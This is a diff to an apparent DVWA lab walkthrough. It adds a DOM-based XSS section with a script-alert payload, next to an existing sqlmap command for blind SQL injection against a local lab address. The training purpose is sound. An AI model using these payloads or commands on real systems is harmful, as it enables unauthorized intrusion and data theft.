@@ -156,6 +156,12 @@ Trigger:
     # exploitation (retreiving DBMS version) 
     $ sqlmap.py --batch --cookie="PHPSESSID=${PHPSESSID};security=low" --technique=B -u "http://192.168.56.101/DVWA/vulnerabilities/sqli_blind/index.php?id=3&Submit=Submit" -p "id" -t ./sqlmap.log --sql-query="SELECT version();
 
+### XSS (DOM)
+
+Payload that ilustrates vulnerability:
+
+    English<script>alert(1);</script>
+
 ### XSS (Reflected)
 
 Trigger vulnerability (via browser):
